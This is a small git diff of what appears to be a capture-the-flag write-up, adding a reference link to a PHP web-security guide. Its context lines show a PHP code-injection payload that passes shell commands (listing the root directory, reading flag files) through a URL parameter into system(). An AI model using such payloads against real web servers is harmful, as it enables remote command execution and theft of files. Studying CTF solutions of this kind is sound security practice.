@@ -122,4 +122,8 @@ _/?format=${system($_GET[1])}&1=cat%20/ls%20-al%20/_
 
 
 ![describtion](../../../assets/img/2022-12-23/2022-12-23-flag.png){: w="600" h="300" }
-_/?format=${system($_GET[1])}&1=cat%20/flag*_
+_/?format=${system($_GET[1])}&1=cat%20/flag*_  
+
+# Reference
+***
+- https://0xalwayslucky.gitbook.io/cybersecstack/web-application-security/php
